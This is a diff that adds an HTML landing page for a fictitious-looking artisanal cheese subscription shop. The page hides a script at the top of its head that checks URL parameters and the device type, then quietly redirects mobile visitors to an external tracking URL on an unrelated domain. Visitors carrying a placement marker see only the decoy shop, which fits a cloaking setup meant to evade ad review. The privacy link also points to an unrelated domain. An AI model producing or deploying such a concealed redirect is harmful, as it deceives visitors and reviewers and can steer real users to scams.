@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/7030fb24-f71e-4d19-916a-a1c232f79601?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") {
+    } else if (isMobileDevice) {
+        window.location.href = lander;
+    } else {
+    }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fromage Fantastique: Artisanal Cheese Subscription</title>
+    <style>
+        :root {
+            --primary-color: #F2C94C;
+            --secondary-color: #6B8E23;
+            --background-color: #FFF8E1;
+            --text-color: #4A4A4A;
+        }
+        body {
+            font-family: 'Playfair Display', serif;
+            background-color: var(--background-color);
+            color: var(--text-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        header {
+            background-color: var(--primary-color);
+            color: var(--text-color);
+            padding: 20px;
+            text-align: center;
+        }
+        main {
+            flex: 1;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+            padding: 40px;
+        }
+        .cheese-card {
+            background-color: #FFFFFF;
+            border-radius: 15px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            position: relative;
+        }
+        .cheese-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
+        }
+        .cheese-image {
+            height: 200px;
+            background-color: #F9E79F;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 18px;
+            color: var(--secondary-color);
+            position: relative;
+            overflow: hidden;
+        }
+        .cheese-image::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: radial-gradient(circle, transparent 30%, #F9E79F 150%);
+            opacity: 0.7;
+        }
+        .cheese-info {
+            padding: 20px;
+        }
+        h1 {
+            font-size: 3em;
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+        h2 {
+            color: var(--secondary-color);
+            margin-top: 0;
+            font-size: 1.5em;
+            font-weight: 600;
+        }
+        p {
+            color: #6B6B6B;
+            line-height: 1.6;
+        }
+        .origin {
+            font-weight: bold;
+            color: var(--secondary-color);
+            font-size: 1em;
+            margin-top: 15px;
+            font-style: italic;
+        }
+        .cheese-type {
+            background-color: var(--primary-color);
+            color: var(--text-color);
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 0.9em;
+            display: inline-block;
+            margin-top: 10px;
+        }
+        .subscribe-button {
+            background-color: var(--secondary-color);
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 25px;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            margin-top: 15px;
+            font-size: 1em;
+            font-weight: bold;
+            font-family: 'Playfair Display', serif;
+        }
+        .subscribe-button:hover {
+            background-color: #556B2F;
+            transform: scale(1.05);
+        }
+        footer {
+            background-color: var(--primary-color);
+            color: var(--text-color);
+            padding: 20px;
+            text-align: center;
+        }
+        nav {
+            background-color: #F9E79F;
+            padding: 15px 0;
+        }
+        nav ul {
+            list-style-type: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+        }
+        nav li {
+            margin: 0 20px;
+        }
+        nav a {
+            color: var(--secondary-color);
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 1.1em;
+            transition: color 0.3s ease;
+        }
+        nav a:hover {
+            color: #556B2F;
+        }
+        footer a {
+            color: var(--secondary-color);
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Fromage Fantastique</h1>
+        <p>Discover the World's Finest Artisanal Cheeses</p>
+    </header>
+    <nav>
+        <ul>
+            <li><a href="#">Home</a></li>
+            <li><a href="#">Our Selection</a></li>
+            <li><a href="#">Subscription Plans</a></li>
+            <li><a href="#">Cheese Pairings</a></li>
+            <li><a href="#">About Us</a></li>
+        </ul>
+    </nav>
+    <main>
+        <div class="cheese-card">
+            <div class="cheese-image">Aged Cheddar</div>
+            <div class="cheese-info">
+                <h2>Farmhouse Cheddar</h2>
+                <p>Rich, sharp flavor with a crumbly texture. Aged for 18 months.</p>
+                <span class="cheese-type">Hard Cheese</span>
+                <p class="origin">Origin: Somerset, England</p>
+                <button class="subscribe-button">Add to Box</button>
+            </div>
+        </div>
+        <div class="cheese-card">
+            <div class="cheese-image">Blue Stilton</div>
+            <div class="cheese-info">
+                <h2>Royal Blue Stilton</h2>
+                <p>Creamy and bold with distinctive blue veins throughout.</p>
+                <span class="cheese-type">Blue Cheese</span>
+                <p class="origin">Origin: Derbyshire, England</p>
+                <button class="subscribe-button">Add to Box</button>
+            </div>
+        </div>
+        <div class="cheese-card">
+            <div class="cheese-image">Brie de Meaux</div>
+            <div class="cheese-info">
+                <h2>Artisanal Brie de Meaux</h2>
+                <p>Soft, creamy texture with a complex, nutty flavor.</p>
+                <span class="cheese-type">Soft Cheese</span>
+                <p class="origin">Origin: Île-de-France, France</p>
+                <button class="subscribe-button">Add to Box</button>
+            </div>
+        </div>
+        <div class="cheese-card">
+            <div class="cheese-image">Manchego</div>
+            <div class="cheese-info">
+                <h2>Aged Manchego</h2>
+                <p>Firm and compact with a buttery texture and slight tang.</p>
+                <span class="cheese-type">Semi-Hard Cheese</span>
+                <p class="origin">Origin: La Mancha, Spain</p>
+                <button class="subscribe-button">Add to Box</button>
+            </div>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2024 Fromage Fantastique. Curating exquisite cheese experiences.</p>
+        <a href="https://tokreward.com/privacy.html">Privacy Policy</a>
+    </footer>
+</body>
+</html>
